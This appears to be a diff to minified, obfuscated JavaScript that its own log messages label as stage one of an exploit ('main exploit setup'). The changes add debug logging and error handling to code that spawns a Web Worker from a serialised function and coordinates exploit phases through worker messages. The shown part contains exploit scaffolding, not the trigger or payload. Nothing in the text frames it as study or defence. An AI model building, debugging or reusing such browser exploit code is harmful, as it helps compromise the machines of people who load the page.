@@ -1098,34 +1098,48 @@ async function q(t, e) {
     };
     const a = () => {
       window.log("[STAGE1] a() called - creating worker");
-      const t = q.toString();
-      const e = "(" + t.toString() + ")()";
-      const c = URL.createObjectURL(new Blob([e], {
-        type: "text/javascript"
-      }));
-      const h = new Worker(c);
-      URL.revokeObjectURL(c);
-      window.log("[STAGE1] a() - worker created, setting up handlers");
-      o("");
-      h.onerror = (t) => {
+      try {
+        const t = q.toString();
+        const e = "(" + t.toString() + ")()";
+        window.log("[STAGE1] a() - worker code length: " + e.length);
+        const c = URL.createObjectURL(new Blob([e], {
+          type: "text/javascript"
+        }));
+        const h = new Worker(c);
+        URL.revokeObjectURL(c);
+        window.log("[STAGE1] a() - worker created, setting up handlers");
         o("");
-        window.log("[STAGE1 ERROR] worker.onerror: " + (t && t.message));
-      };
-      h.onmessage = (t) => {
-        window.log("[STAGE1 ERROR] worker.onmessage type=" + (t && t.data && t.data.type));
-        if (t.data.type === n) ;else if (t.data.type === r) {
+        h.onerror = (t) => {
+          window.log("[STAGE1 ERROR] worker.onerror: " + (t && t.message) + " line=" + (t && t.lineno));
           o("");
-          h.terminate();
-          a();
-        } else if (t.data.type === i) {
-          o("");
-          window.setTimeout(u, 0);
-        }
-      };
-      h.postMessage({
-        type: s,
-        xn: l
-      });
+        };
+        h.onmessage = (t) => {
+          const msgType = t && t.data && t.data.type;
+          window.log("[STAGE1] h.onmessage fired with type=" + msgType);
+          if (t.data.type === n) {
+            // type 0 - debug message from worker
+            window.log("[STAGE1] WORKER: " + (t.data.msg || ""));
+          } else if (t.data.type === r) {
+            window.log("[STAGE1] h.onmessage type=r, calling a()");
+            o("");
+            h.terminate();
+            a();
+          } else if (t.data.type === i) {
+            window.log("[STAGE1] h.onmessage type=i, scheduling u()");
+            o("");
+            window.setTimeout(u, 0);
+          }
+        };
+        window.log("[STAGE1] a() - about to postMessage with type=" + s);
+        h.postMessage({
+          type: s,
+          xn: l
+        });
+        window.log("[STAGE1] a() - postMessage sent, waiting for worker response");
+      } catch (err) {
+        window.log("[STAGE1 ERROR] a() exception: " + (err && err.message));
+        throw err;
+      }
     };
     window.log("[STAGE1] ht() - calling a() to set up and trigger worker");
     a();
@@ -1445,11 +1459,23 @@ async function q(t, e) {
     window.log("[STAGE1] >>> Starting main exploit setup (ht)");
     ht(t);
   } else {
+    // Worker thread code
+    try {
+      self.postMessage({ type: 0, msg: "worker_started" });
+    } catch (e) {
+      // postMessage might not work immediately
+    }
     o("");
     self.onmessage = (t) => {
+      try {
+        self.postMessage({ type: 0, msg: "worker_onmessage_fired type=" + (t && t.data && t.data.type) });
+      } catch (e) {}
       o("");
       if (t.data.type === s) {
         o("");
+        try {
+          self.postMessage({ type: 0, msg: "worker_executing_phase type=s" });
+        } catch (e) {}
         l = t.data.xn;
         et();
         ct();
